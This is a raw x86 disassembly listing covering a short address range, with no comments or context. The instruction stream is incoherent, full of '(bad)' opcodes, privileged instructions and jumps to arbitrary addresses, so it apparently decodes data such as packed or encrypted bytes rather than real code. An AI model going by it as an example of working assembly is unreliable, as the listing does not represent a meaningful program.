  499db8:	inc    esi
  499db9:	jl     0x499d82
  499dbb:	jmp    0x499e35
  499dbd:	xchg   ebx,eax
  499dbe:	inc    edx
  499dbf:	daa    
  499dc0:	(bad)  
  499dc1:	or     BYTE PTR [ebx],bh
  499dc3:	xor    al,0x6a
  499dc5:	adc    ebp,DWORD PTR ds:0x8408266f
  499dcb:	dec    edi
  499dcc:	sbb    eax,0xc41bdc65
  499dd1:	fdiv   DWORD PTR [edx]
  499dd3:	dec    ecx
  499dd4:	sub    ah,bl
  499dd6:	retf   0x8594
  499dd9:	lahf   
  499dda:	mul    ch
  499ddc:	and    dh,BYTE PTR [ebx-0x654add6b]
  499de2:	sub    eax,0xc468f111
  499de7:	dec    esp
  499de8:	and    eax,0x6752dd5b
  499ded:	sbb    al,BYTE PTR [eax]
  499def:	xor    edx,DWORD PTR ds:0xbfad9e66
  499df5:	test   BYTE PTR [eax-0x67feb1f],0x4
  499dfc:	jne    0x499d86
  499dfe:	cmp    DWORD PTR ds:0x1da0a779,esi
  499e04:	adc    dh,dh
  499e06:	push   ds
  499e07:	or     BYTE PTR [eax-0x74],bh
  499e0a:	xor    dh,BYTE PTR [ecx]
  499e0c:	jnp    0x499da7
  499e0e:	xor    bh,bl
  499e10:	sub    esi,edi
  499e12:	adc    dh,BYTE PTR [eax]
  499e14:	imul   esi,eax,0x83734f6e
  499e1a:	jp     0x499e2c
  499e1c:	mov    DWORD PTR [edi],esi
  499e1e:	das    
  499e1f:	xor    DWORD PTR [eax],esp
  499e21:	inc    edi
  499e22:	cli    
  499e23:	pop    eax
  499e24:	add    esp,DWORD PTR [ecx]
  499e26:	fstp   QWORD PTR [esi]
  499e28:	jecxz  0x499dff
  499e2a:	and    edi,DWORD PTR [esi-0x1e4cdd32]
  499e30:	and    BYTE PTR [esi],al
  499e32:	dec    ecx
  499e33:	adc    DWORD PTR [ebx+0x2a],eax
  499e36:	popf   
  499e37:	jno    0x499dd0
  499e39:	adc    BYTE PTR [ecx-0x31],cl
  499e3c:	mov    BYTE PTR [edx-0x7e],ah
  499e3f:	push   ds
  499e40:	nop
  499e41:	popa   
  499e42:	push   ss
  499e43:	mov    ?,WORD PTR [esi]
  499e45:	push   esi
  499e46:	fcmovb st,st(0)
  499e48:	data16 mov fs,WORD PTR [eax]
  499e4b:	jle    0x499e5d
  499e4d:	cmc    
  499e4e:	popa   
  499e4f:	call   0x6674901c
  499e54:	cmp    eax,DWORD PTR [esi]
  499e56:	mov    BYTE PTR [edi],dl
  499e58:	nop
  499e59:	and    cl,BYTE PTR [esi]
  499e5b:	daa    
  499e5c:	mov    dh,0xd0
  499e5e:	and    eax,0xb203e22
  499e63:	clc    
  499e64:	icebp  
  499e65:	dec    ebp
  499e66:	sub    eax,0xb615743b
  499e6b:	or     al,0x50
  499e6d:	daa    
  499e6e:	xchg   esp,eax
  499e6f:	add    eax,0x8098f47
  499e74:	inc    edi
  499e75:	xchg   ebx,eax
  499e76:	sub    al,0x6c
  499e78:	stos   BYTE PTR es:[edi],al
  499e79:	jmp    0x499e47
  499e7b:	pop    edx
  499e7c:	and    BYTE PTR [edx+0x5b],dl
  499e7f:	lds    eax,FWORD PTR [esi]
  499e81:	lock dec ebp
  499e83:	daa    
  499e84:	dec    edx
  499e85:	and    BYTE PTR [eax-0x5f],dl
  499e88:	mov    WORD PTR [ebp+0x1e443f7e],gs
  499e8e:	pop    esp
  499e8f:	je     0x499ea3
  499e91:	push   0x20
  499e93:	push   0xa9751c5c
  499e98:	dec    esp
  499e99:	mov    ds:0x150d5f05,eax
  499e9e:	call   0x8ac4e991
  499ea3:	mov    eax,ds:0x4082bc1b
  499ea8:	mov    ds:0x77dda91c,eax
  499ead:	popa   
  499eae:	test   eax,0x7f5028b0
  499eb3:	pop    ds
  499eb4:	mov    dh,0xa0
  499eb6:	add    ecx,0x77100003
  499ebc:	arpl   WORD PTR [eax],sp
  499ebe:	cmp    al,0x89
  499ec0:	test   DWORD PTR gs:[ecx+0x1a],ebx
  499ec4:	or     al,0x47
  499ec6:	mov    esp,ebx
  499ec8:	pop    eax
  499ec9:	and    al,0x7e
  499ecb:	gs push es
  499ecd:	and    esp,DWORD PTR [ecx-0x77]
  499ed0:	inc    edx
  499ed1:	mov    dh,cl
  499ed3:	fwait
  499ed4:	nop
  499ed5:	loopne 0x499eea
  499ed7:	scas   al,BYTE PTR es:[edi]
  499ed8:	aas    
  499ed9:	mov    bh,0x2b
  499edb:	xchg   ebx,eax
  499edc:	pusha  
  499edd:	or     BYTE PTR [esi+0xffc4489],0x23
  499ee4:	(bad)  
  499ee5:	outs   dx,DWORD PTR ds:[esi]
  499ee6:	cmp    BYTE PTR [ebp-0x42],0x3e
  499eea:	jns    0x499eab
  499eec:	lds    eax,FWORD PTR [esi-0x78]
  499eef:	and    al,BYTE PTR [ecx]
  499ef1:	imul   edx,ebp,0xffffffb6
  499ef4:	mov    BYTE PTR [edi+0x23],0x1
  499ef8:	sbb    al,0x24
  499efa:	les    ebx,FWORD PTR [eax+0x28270e54]
  499f00:	sbb    bl,0xcc
  499f03:	xor    ebp,DWORD PTR [ebx+0x266f5d0c]
  499f09:	sub    bh,BYTE PTR [edx]
  499f0b:	sub    DWORD PTR [ecx],eax
  499f0d:	inc    ebx
  499f0e:	xor    BYTE PTR [edx+0x3f699cf4],dl
  499f14:	(bad)  
  499f15:	out    dx,eax
  499f16:	addr16 fwait
  499f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  499f19:	and    BYTE PTR [edx],bh
  499f1b:	sbb    al,0xeb
  499f1d:	xor    DWORD PTR [eax+edi*4-0x78],ebx
  499f21:	inc    edi
  499f22:	sbb    eax,0x67001e1e
  499f27:	sub    eax,0xe587213d
  499f2c:	bound  eax,QWORD PTR [eax]
  499f2e:	imul   esi,DWORD PTR [edi+eiz*1+0xb532374],0x71
  499f36:	cmp    al,BYTE PTR [edi+eax*2-0x19432de0]
  499f3d:	mov    dh,0xf0
  499f3f:	mov    esp,0xac06e8c1
  499f44:	push   0x30
  499f46:	mov    ds:0x25ae606,eax
  499f4b:	in     al,dx
  499f4c:	inc    esi
  499f4d:	jo     0x499fae
  499f4f:	push   0x30a2d901
  499f54:	push   esi
  499f55:	rcl    BYTE PTR [ecx+0x1d],0x85
  499f59:	xchg   DWORD PTR [eax+0x77],eax
  499f5c:	dec    edi
  499f5d:	sub    DWORD PTR [eax-0x7f],eax
  499f60:	sbb    al,0xc0
  499f62:	xchg   DWORD PTR [eax],eax
  499f64:	xor    esp,edx
  499f66:	lods   al,BYTE PTR ds:[esi]
  499f67:	push   0xcfe07805
  499f6c:	fwait
  499f6d:	add    eax,0x15733d7
  499f72:	imul   edx,DWORD PTR [edx+0x77a64383],0x2f
  499f79:	and    DWORD PTR ds:0x9764b484,ebp
  499f7f:	xor    al,0xa0
  499f81:	add    DWORD PTR [edx+ecx*4+0x4d],esp
  499f85:	mov    ah,0xd1
  499f87:	jae    0x499f63
  499f89:	mov    ch,0xb5
  499f8b:	sbb    BYTE PTR [esp+eax*4+0x5c],ah
  499f8f:	fcom   st(0)
  499f91:	push   cs
  499f92:	outs   dx,DWORD PTR ds:[esi]
  499f93:	add    DWORD PTR [ecx+edx*2+0x57],edx
  499f97:	lock je 0x499f1d
  499f9a:	ss call 0xb17a:0x8a028f07
  499fa2:	add    al,bh
  499fa4:	sbb    cl,0x91
  499fa7:	add    DWORD PTR [eax],edi
  499fa9:	sbb    bh,0x1c
  499fac:	cmp    eax,DWORD PTR [eax]
  499fae:	fild   WORD PTR [esi]
  499fb0:	xor    BYTE PTR [edi+ebx*8-0x42],dl
  499fb4:	add    BYTE PTR [ebp+0x64],dh
  499fb7:	jne    0x499f85
  499fb9:	fadd   QWORD PTR [ebx]
  499fbb:	rcl    DWORD PTR [esi],0xd2
  499fbe:	dec    edx
  499fbf:	and    BYTE PTR ds:0x93213dbc,bh
  499fc5:	fadd   QWORD PTR [ebp-0x1c]
  499fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499fc9:	pop    ebp
  499fca:	cld    
  499fcb:	inc    ebx
  499fcc:	xchg   ebp,eax
  499fcd:	inc    eax
  499fce:	or     al,0xf2
  499fd0:	adc    BYTE PTR [eax],cl
  499fd2:	mov    ebx,esi
  499fd4:	std    
  499fd5:	popf   
  499fd6:	add    al,0xe2
  499fd8:	sbb    eax,0xe3be76dc
  499fdd:	jne    0x499f9c
  499fdf:	test   al,0x93
  499fe1:	out    0xe0,al
  499fe3:	sub    DWORD PTR [ebp-0x44],esi
  499fe6:	test   BYTE PTR [edx],cl
  499fe8:	daa    
  499fe9:	sbb    eax,0x6802639e
  499fef:	pop    esi
  499ff0:	xor    ebp,esi
  499ff2:	dec    edi
  499ff3:	pop    edx
  499ff4:	js     0x49a040
  499ff6:	mov    esp,0xacc1f96b
  499ffb:	xor    bl,BYTE PTR [ebp-0x74]
  499ffe:	push   ebx
  499fff:	cmp    DWORD PTR [edx+0x14da9cfb],esp
  49a005:	je     0x499fee
  49a007:	xor    al,0x99
  49a009:	imul   esp,eax,0xffffff9b
  49a00c:	xchg   bh,cl
  49a00e:	ins    DWORD PTR es:[edi],dx
  49a00f:	pop    es
  49a010:	enter  0xe465,0xa4
  49a014:	(bad)  
  49a015:	xor    DWORD PTR [edx],esi
  49a017:	and    BYTE PTR [ebx],al
  49a019:	repnz iret 
  49a01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a01c:	in     al,0x93
  49a01e:	adc    al,0x88
  49a020:	inc    ecx
  49a021:	xor    DWORD PTR [ebx+0x2c2b6005],esi
  49a027:	bound  ebx,QWORD PTR [ebx-0x15]
  49a02a:	pop    es
  49a02b:	out    dx,al
  49a02c:	sti    
  49a02d:	and    edi,DWORD PTR [eax]
  49a02f:	scas   eax,DWORD PTR es:[edi]
  49a030:	in     eax,0x85
  49a032:	adc    al,0xd3
  49a034:	dec    ebp
  49a035:	cld    
  49a036:	dec    ecx
  49a037:	cmp    ecx,DWORD PTR [eax]
  49a039:	(bad)  
  49a03a:	mov    ah,0x5c
  49a03c:	in     al,dx
  49a03d:	dec    esi
  49a03e:	daa    
  49a03f:	fs inc edi
  49a041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a042:	xchg   ecx,eax
  49a043:	xchg   ecx,eax
  49a044:	sub    BYTE PTR [ebx+0x103b4a38],0xee
  49a04b:	add    ebx,DWORD PTR [eax-0x36cf4b1b]
  49a051:	push   0x24
  49a053:	mov    gs,WORD PTR [ebx-0x1f]
  49a056:	adc    eax,0xdf12b76f
  49a05b:	fwait
  49a05c:	inc    edi
  49a05d:	push   0x74
  49a05f:	inc    ecx
  49a060:	adc    eax,DWORD PTR [edi]
  49a062:	js     0x49a03b
  49a064:	xchg   BYTE PTR [ebp+0xa],dh
  49a067:	test   BYTE PTR [edi],0x6e
  49a06a:	and    DWORD PTR [edi],eax
  49a06c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a06d:	int3   
  49a06e:	jp     0x49a0bb
  49a070:	fwait
  49a071:	add    bh,BYTE PTR [edi+0x14]
  49a074:	push   es
  49a075:	std    
  49a076:	sub    eax,0x7c
  49a079:	mov    edx,0xd17dd187
  49a07e:	rcr    BYTE PTR [ebx],0xdd
  49a081:	nop
  49a082:	mov    edi,0xb3de427a
  49a087:	jns    0x49a063
  49a089:	jns    0x49a065
  49a08b:	or     al,0xa2
  49a08d:	lock lea edx,[edx]
  49a090:	call   0xe13bbd18
  49a095:	jae    0x49a083
  49a097:	jns    0x49a034
  49a099:	adc    edx,DWORD PTR [esi-0x4c7bebbd]
  49a09f:	or     DWORD PTR [eax-0x3d],esi
  49a0a2:	nop
  49a0a3:	idiv   dh
  49a0a5:	push   es
  49a0a6:	push   edx
  49a0a7:	push   0x72
  49a0a9:	and    edx,DWORD PTR [esi]
  49a0ab:	push   eax
  49a0ac:	xchg   BYTE PTR [edi-0x7e36be5d],al
  49a0b2:	mov    ebp,0xd97af28d
  49a0b7:	mov    eax,0x10b3e394
  49a0bc:	xchg   ebx,eax
  49a0bd:	xchg   ebp,eax
  49a0be:	idiv   ebx
  49a0c0:	mov    al,ds:0xeb78d8aa
  49a0c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a0c6:	or     dh,BYTE PTR [ebp-0x15]
  49a0c9:	sahf   
  49a0ca:	sub    BYTE PTR [ebp+0x54863095],dl
  49a0d0:	jns    0x49a0e2
  49a0d2:	mov    eax,ds:0x7e0ac8c
  49a0d7:	sbb    al,bl
  49a0d9:	jle    0x49a0ef
  49a0db:	mov    dl,dh
  49a0dd:	push   eax
  49a0de:	push   0x40a5889f
  49a0e3:	test   BYTE PTR [edi+0x34],bl
  49a0e6:	xchg   ebp,eax
  49a0e7:	ss js  0x49a0fe
  49a0ea:	cld    
  49a0eb:	pushf  
  49a0ec:	retf   0x200
  49a0ef:	add    DWORD PTR [esi-0x58],ebp
  49a0f2:	iret   
  49a0f3:	sub    eax,0x44e6611
  49a0f8:	sub    BYTE PTR [ecx+0x34],ch
  49a0fb:	jge    0x49a106
  49a0fd:	or     ebx,DWORD PTR [esi+0x6a]
  49a100:	outs   dx,DWORD PTR ds:[esi]
  49a101:	push   ecx
  49a102:	retf   
  49a103:	push   edi
  49a104:	jb     0x49a0fb
  49a106:	mov    eax,ds:0x8330f802
  49a10b:	ret    
  49a10c:	and    esp,DWORD PTR [eax+0x29]
  49a10f:	add    ch,BYTE PTR [edi]
  49a111:	enter  0xb62d,0xf
  49a115:	jp     0x49a110
  49a117:	and    al,0x75
  49a119:	push   ss
  49a11a:	push   edx
  49a11b:	inc    eax
  49a11c:	mov    DWORD PTR [eax],esp
  49a11e:	add    al,0x86
  49a120:	dec    ecx
  49a121:	add    BYTE PTR [esp+ebp*4+0x68],cl
  49a125:	fbstp  TBYTE PTR [ebx+eiz*8+0x72]
  49a129:	enter  0x34c6,0x1e
  49a12d:	ss mov edx,eax
  49a130:	pop    es
  49a131:	das    
  49a132:	add    eax,0x30040fad
  49a137:	xchg   ecx,eax
  49a138:	push   0x69
  49a13a:	sub    ch,BYTE PTR [ebx-0x3a]
  49a13d:	add    bh,ch
  49a13f:	mov    al,ds:0x5de693d1
  49a144:	mov    edx,0xa2a864c
  49a149:	mov    bh,0x12
  49a14b:	call   0xf4bf:0x7e0849
  49a152:	fst    QWORD PTR [ebp+0x3754a49]
  49a158:	sbb    al,0xc2
  49a15a:	adc    al,0x86
  49a15c:	pushf  
  49a15d:	and    dh,BYTE PTR [eax]
  49a15f:	mov    ebx,0x1a0a6768
  49a164:	sbb    al,0x40
  49a166:	out    dx,al
  49a167:	jmp    FWORD PTR [esi]
  49a169:	lahf   
  49a16a:	pop    es
  49a16b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a16c:	xor    al,0x6e
  49a16e:	mov    eax,0x3fc9d08f
  49a173:	fdiv   DWORD PTR [edi+ebx*8-0x148dddf1]
  49a17a:	cmp    DWORD PTR [edx],ecx
  49a17c:	imul   ebp,ebx,0xeb41c833
  49a182:	daa    
  49a183:	mov    ds:0x431b6be0,al
  49a188:	mov    ecx,DWORD PTR [ebx]
  49a18a:	inc    esi
  49a18b:	mov    BYTE PTR [esi],dl
  49a18d:	mov    al,ds:0x6855f874
  49a192:	stos   DWORD PTR es:[edi],eax
  49a193:	inc    edi
  49a194:	adc    eax,0xe06dadf
  49a199:	mov    esp,0x510a48bd
  49a19e:	push   0x48114a91
  49a1a3:	adc    al,0x59
  49a1a5:	out    dx,eax
  49a1a6:	sbb    eax,0x1e25a586
  49a1ab:	lods   al,BYTE PTR ds:[esi]
  49a1ac:	sbb    ecx,ecx
  49a1ae:	cld    
  49a1af:	shr    DWORD PTR [esi],0xf6
  49a1b2:	lock leave 
  49a1b4:	pop    es
  49a1b5:	test   BYTE PTR es:[ecx-0x18],dh
  49a1b9:	push   ecx
  49a1ba:	and    eax,0xc5ec3e3a
  49a1bf:	pop    ds
  49a1c0:	adc    ebp,eax
  49a1c2:	jnp    0x7059d9df
  49a1c8:	add    DWORD PTR [edx],0xe
  49a1cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49a1cc:	add    esp,DWORD PTR [ebx-0x67]
  49a1cf:	mov    bh,0xda
  49a1d1:	das    
  49a1d2:	push   0x4c2aa2f2
  49a1d7:	xor    BYTE PTR [edx],0xa0
  49a1da:	add    BYTE PTR [edx+0x5bc06e9f],0x91
  49a1e1:	fidiv  DWORD PTR [eax]
  49a1e3:	sub    al,0x28
  49a1e5:	push   esp
  49a1e6:	add    al,0x12
  49a1e8:	pop    esp
  49a1e9:	dec    esp
  49a1ea:	and    BYTE PTR [eax],ch
  49a1ec:	inc    ecx
  49a1ed:	loopne 0x49a26b
  49a1ef:	repnz fsubrp st(2),st
  49a1f2:	fld    DWORD PTR [ecx]
  49a1f4:	mov    ds:0xde3fd87c,eax
  49a1f9:	inc    edi
  49a1fa:	dec    edi
  49a1fb:	adc    BYTE PTR [eax+0x6],bh
  49a1fe:	pushf  
  49a1ff:	mov    ds:0x93b74219,eax
  49a204:	ds adc bl,al
  49a207:	dec    ebx
  49a208:	cmp    ecx,ebx
  49a20a:	dec    esp
  49a20b:	pop    ss
  49a20c:	pop    eax
  49a20d:	loope  0x49a1fd
  49a20f:	xchg   esi,esi
  49a211:	scas   eax,DWORD PTR es:[edi]
  49a212:	fnstenv [edx]
  49a214:	or     esp,DWORD PTR [ebx]
  49a216:	daa    
  49a217:	sub    ebx,DWORD PTR [eax+0x50]
  49a21a:	cmp    al,0xeb
  49a21c:	mov    ecx,0x7833b69
  49a221:	add    bh,BYTE PTR [eax-0x11]
  49a224:	and    eax,0xe898a004
  49a229:	lods   al,BYTE PTR ds:[esi]
  49a22a:	imul   edx,esi,0xea779a8d
  49a230:	jge    0x49a1b8
  49a232:	sbb    BYTE PTR [ebx],al
  49a234:	xchg   ecx,eax
  49a235:	clc    
  49a236:	mov    edx,0x193bc097
  49a23b:	ret    0xd61f
  49a23e:	jge    0x49a248
  49a240:	push   ebx
  49a241:	push   0xec83008a
  49a246:	popa   
  49a247:	xor    al,0x71
  49a249:	clc    
  49a24a:	jne    0x49a26c
  49a24c:	mov    BYTE PTR [ebx],0x50
  49a24f:	inc    eax
  49a250:	into   
  49a251:	call   0x718b7762
  49a256:	sbb    esp,DWORD PTR [edx+esi*1-0x79]
  49a25a:	jbe    0x49a286
  49a25c:	(bad)  
  49a25d:	pop    ss
  49a25e:	or     BYTE PTR [ecx],al
  49a260:	mov    cl,0x42
  49a262:	sbb    ebp,esi
  49a264:	icebp  
  49a265:	ficom  DWORD PTR [esi]
  49a267:	inc    esp
  49a268:	hlt    
  49a269:	out    0x85,al
  49a26b:	or     al,0x55
  49a26d:	mov    dh,0xe0
  49a26f:	xor    dl,0x81
  49a272:	stc    
  49a273:	jnp    0x49a2c5
  49a275:	dec    edi
  49a276:	inc    ecx
  49a277:	jb     0xfa3b515
  49a27d:	xchg   BYTE PTR [esi+0x32],al
  49a280:	rcr    BYTE PTR [ebx+ebx*1],cl
  49a283:	popa   
  49a284:	daa    
  49a285:	jp     0x49a2b9
  49a287:	xor    BYTE PTR [ecx+esi*1],dl
  49a28a:	rcr    BYTE PTR [ecx+edi*1],cl
  49a28d:	push   ds
  49a28e:	pop    edi
  49a28f:	pop    ds
  49a290:	(bad)  
  49a291:	sbb    esp,DWORD PTR [eax-0x20]
  49a294:	stos   DWORD PTR es:[edi],eax
  49a295:	test   BYTE PTR [esi+0x7a],dh
  49a298:	xor    eax,0x4e16cba
  49a29d:	aas    
  49a29e:	push   ds
  49a29f:	push   es
  49a2a0:	add    eax,0x6cec16d1
  49a2a5:	xchg   esi,eax
  49a2a6:	addr16 out 0xaf,eax
  49a2a9:	(bad)  
  49a2aa:	js     0x49a31c
  49a2ac:	cmp    BYTE PTR [edx+eax*8+0x4abfdb1d],0xcf
  49a2b4:	inc    eax
  49a2b5:	mov    edi,0x46265b53
  49a2ba:	pop    ebx
  49a2bb:	imul   edx,DWORD PTR [ebp+eiz*1+0x45],0x68
  49a2c0:	or     eax,DWORD PTR [ebx]
  49a2c2:	push   ecx
  49a2c3:	jge    0x49a33b
  49a2c5:	and    esp,DWORD PTR [esi+0x445f5576]
  49a2cb:	xlat   BYTE PTR ds:[ebx]
  49a2cc:	inc    ebx
  49a2cd:	pop    ds
  49a2ce:	jo     0x49a312
  49a2d0:	cs fs inc esi
  49a2d3:	inc    ebp
  49a2d4:	test   ebx,ebx
  49a2d6:	pop    edi
  49a2d7:	sar    BYTE PTR [edx+0x395e6300],cl
  49a2dd:	pop    ecx
  49a2de:	add    al,BYTE PTR [edx]
  49a2e0:	(bad)  
  49a2e1:	shr    DWORD PTR [ecx+0x18],1
  49a2e4:	cmp    ah,dl
  49a2e6:	cmp    ebx,DWORD PTR [ebx-0xf]
  49a2e9:	sub    al,0x78
  49a2eb:	pusha  
  49a2ec:	into   
  49a2ed:	mov    WORD PTR [ebx],gs
  49a2ef:	mov    ebx,0xc1c7e00f
  49a2f4:	xchg   ecx,eax
  49a2f5:	fcom   DWORD PTR [eax+0x7b]
  49a2f8:	push   es
  49a2f9:	(bad)  
  49a2fa:	or     eax,0x3e49c807
  49a2ff:	jne    0x49a2e1
  49a301:	lea    ecx,[esi+0x45]
  49a304:	in     al,0x55
  49a306:	je     0x49a2a0
  49a308:	dec    edx
  49a309:	cdq    
  49a30a:	fsub   QWORD PTR [esi+0x36]
  49a30d:	or     DWORD PTR [ecx],ecx
  49a30f:	clc    
  49a310:	or     al,0xcb
  49a312:	inc    ebp
  49a313:	and    BYTE PTR [edx+0x309f911b],0x3c
  49a31a:	nop
  49a31b:	out    dx,al
  49a31c:	dec    edx
  49a31d:	sub    BYTE PTR [ebx-0x5cd06ac6],0x9
  49a324:	je     0x49a2f5
  49a326:	popf   
  49a327:	add    edi,esp
  49a329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49a32a:	and    DWORD PTR ds:0x4a4b481f,ebx
  49a330:	mov    edx,eax
  49a332:	ret    
  49a333:	mov    cl,0xd5
  49a335:	xchg   ecx,eax
  49a336:	fcom   QWORD PTR [ebp-0x14]
  49a339:	shl    DWORD PTR [ebp+eiz*2-0x27f6e493],0x6
  49a341:	mov    eax,0x6811b438
  49a346:	mov    WORD PTR [ecx-0x1c],ds
  49a349:	or     edx,DWORD PTR [esi-0x1faf509f]
  49a34f:	add    ch,BYTE PTR [edi-0x4a]
  49a352:	mov    edi,0xb6d52c7f
  49a357:	adc    BYTE PTR [ebp-0x6f799677],dh
  49a35d:	jl     0x49a3ac
  49a35f:	in     al,dx
  49a360:	push   ecx
  49a361:	jb     0x49a2e9
  49a363:	mov    BYTE PTR [edi],ch
  49a365:	push   ebp
  49a366:	mov    esp,0x7b7d52e5
  49a36b:	mov    ah,0x70
  49a36d:	lea    ebp,[ebp-0x65]
  49a370:	sbb    DWORD PTR [esi],edx
  49a372:	fist   WORD PTR [edi-0x55]
  49a375:	add    eax,DWORD PTR [edx+0x68]
  49a378:	dec    dx
  49a37a:	stos   DWORD PTR es:[edi],eax
  49a37b:	and    esp,esi
  49a37d:	sbb    BYTE PTR [eax-0x6d],dl
  49a380:	mov    edi,0x9788146
  49a385:	jmp    0x49a3e3
  49a387:	jo     0x49a3f1
  49a389:	xor    BYTE PTR [eax+0x62437f19],ah
  49a38f:	ja     0x49a396
  49a391:	sbb    BYTE PTR [ecx+0x3dc20e06],bh
  49a397:	adc    al,0xfe
  49a399:	cmp    eax,0x540e0313
  49a39e:	not    BYTE PTR [ebx+ecx*4]
  49a3a1:	inc    esi
  49a3a2:	inc    eax
  49a3a3:	loopne 0x49a357
  49a3a5:	test   edi,ebx
  49a3a7:	dec    ebp
  49a3a8:	xor    bl,BYTE PTR [edi]
  49a3aa:	add    BYTE PTR [edi],cl
  49a3ac:	cdq    
  49a3ad:	sahf   
  49a3ae:	mov    edi,0x80081067
  49a3b3:	daa    
  49a3b4:	add    dh,cl
  49a3b6:	or     edi,DWORD PTR [ebx+0x74afc6b6]
  49a3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49a3bd:	cdq    
  49a3be:	fld    QWORD PTR [ecx]
  49a3c0:	push   es
  49a3c1:	adc    DWORD PTR [ebx-0x5b],esp
  49a3c4:	pop    edx
  49a3c5:	sbb    eax,0xc40210ad
  49a3ca:	or     eax,DWORD PTR [ecx+0x21]
  49a3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49a3ce:	mov    eax,0x82a65018
  49a3d3:	add    ebx,DWORD PTR [eax]
  49a3d5:	push   ebx
  49a3d6:	lds    ecx,FWORD PTR [esi]
  49a3d8:	mov    eax,0xc800eab2
  49a3dd:	dec    ecx
  49a3de:	fcmovne st,st(7)
  49a3e0:	add    dh,BYTE PTR [edx+0x53cf8950]
  49a3e6:	aam    0x12
  49a3e8:	fmul   QWORD PTR [eax+0x67]
  49a3eb:	push   es
  49a3ec:	jo     0x49a3d7
  49a3ee:	mov    al,ds:0x80b59c1a
  49a3f3:	or     eax,0xef028b95
  49a3f8:	inc    esi
  49a3f9:	ss add esp,edi
  49a3fc:	or     al,0x1f
  49a3fe:	push   eax
  49a3ff:	and    eax,0x304e0653
  49a404:	rol    BYTE PTR [esi-0xa29e07f],0x19
  49a40b:	cmc    
  49a40c:	add    DWORD PTR [ebx+0x6310751e],ecx
  49a412:	or     esi,ebx
  49a414:	daa    
  49a415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a416:	add    ebx,eax
  49a418:	mov    DWORD PTR [esi],ebx
  49a41a:	das    
  49a41b:	inc    ebp
  49a41c:	sbb    eax,0x1b94ed74
  49a421:	ficomp DWORD PTR [edi+0x68]
  49a424:	jle    0x49a3ac
  49a426:	sbb    edi,ebx
  49a428:	adc    ch,BYTE PTR [ebx-0x6a]
  49a42b:	cdq    
  49a42c:	add    eax,DWORD PTR [edi]
  49a42e:	adc    edx,DWORD PTR [edi-0x3e]
  49a431:	loop   0x49a433
  49a433:	fsubrp st(6),st
  49a435:	repnz cmp esi,DWORD PTR [ecx]
  49a438:	jns    0x49a440
  49a43a:	(bad)  
  49a43b:	mov    eax,ds:0xa465a5f0
  49a440:	ja     0x47dfeb
  49a446:	or     eax,0x9282b9ee
  49a44b:	call   0xd25e6d1
  49a450:	icebp  
  49a451:	jne    0x49a3da
  49a453:	jmp    DWORD PTR [esi-0x5a50f580]
  49a459:	or     al,0x59
  49a45b:	ret    
  49a45c:	add    eax,0x6003b300
  49a461:	fld    DWORD PTR [ebx+0x7c34296a]
  49a467:	mov    ebp,0x7419ef95
  49a46c:	fs push edi
  49a46e:	sub    BYTE PTR [ecx],ah
  49a470:	lods   eax,DWORD PTR ds:[esi]
  49a471:	xor    edi,DWORD PTR [esi+eiz*2+0x278d2eac]
  49a478:	cld    
  49a479:	push   es
  49a47a:	inc    ebx
  49a47b:	mov    ebp,0x4c530040
  49a480:	add    DWORD PTR [esi],esi
  49a482:	adc    al,0xe5
  49a484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a485:	pop    eax
  49a486:	inc    edi
  49a487:	adc    al,0x50
  49a489:	dec    ecx
  49a48a:	rcl    DWORD PTR [ebx+0x60584302],1
  49a490:	jo     0x49a4de
  49a492:	or     ebx,edi
  49a494:	push   cs
  49a495:	push   0x30
  49a497:	adc    BYTE PTR [ebx],cl
  49a499:	mov    al,0xb0
  49a49b:	test   DWORD PTR ds:0xdc8927ed,ebx
  49a4a1:	call   0x2c24:0xbfed9a6f
  49a4a8:	push   esp
  49a4a9:	pusha  
  49a4aa:	inc    ebp
  49a4ab:	dec    ebp
  49a4ac:	adc    al,0x52
  49a4ae:	mov    edx,DWORD PTR [ebp-0x58]
  49a4b1:	cld    
  49a4b2:	push   es
  49a4b3:	pop    edx
  49a4b4:	jle    0x49a506
  49a4b6:	push   ecx
  49a4b7:	push   edx
  49a4b8:	push   cs
  49a4b9:	je     0x49a4bf
  49a4bb:	das    
  49a4bc:	fcmovne st,st(5)
  49a4be:	shl    DWORD PTR [eax+0x2c403a81],cl
  49a4c4:	push   es
  49a4c5:	add    bh,BYTE PTR [ebx]
  49a4c7:	adc    eax,esp
  49a4c9:	jns    0x49a528
  49a4cb:	inc    edi
  49a4cc:	and    eax,0xee85b078
  49a4d1:	dec    esp
  49a4d2:	lock adc DWORD PTR [eax],edi
  49a4d5:	shl    BYTE PTR [edi+0x464573dd],0x2c
  49a4dc:	jmp    0x49a4c4
  49a4de:	mov    bh,0x3d
  49a4e0:	lea    esi,[eax-0x63ff84fe]
  49a4e6:	dec    ebx
  49a4e7:	jbe    0x49a55e
  49a4e9:	cmp    eax,0xfd9bd37c
  49a4ee:	outs   dx,DWORD PTR ds:[esi]
  49a4ef:	inc    esp
  49a4f0:	mov    ebx,DWORD PTR [eax]
  49a4f2:	sub    ecx,esi
  49a4f4:	lea    edx,[ecx+ecx*1+0x6232e006]
  49a4fb:	mov    WORD PTR [eax-0x4],?
  49a4fe:	pop    ds
  49a4ff:	test   BYTE PTR [ebx+0x5dc0063],dh
  49a505:	or     edi,DWORD PTR [edi]
  49a507:	je     0x49a557
  49a509:	jg     0x49a521
  49a50b:	inc    BYTE PTR [eax]
  49a50d:	mov    edi,0x890f4e8f
  49a512:	outs   dx,DWORD PTR ds:[esi]
  49a513:	mov    bl,0xdd
  49a515:	bound  ecx,QWORD PTR es:[ebp-0x37a3ef4c]
  49a51c:	call   0xc2d8:0x8f168c71
  49a523:	fcmovnbe st,st(6)
  49a525:	repnz cmp BYTE PTR es:[edx+0x25a7168d],0x39
  49a52e:	pop    edi
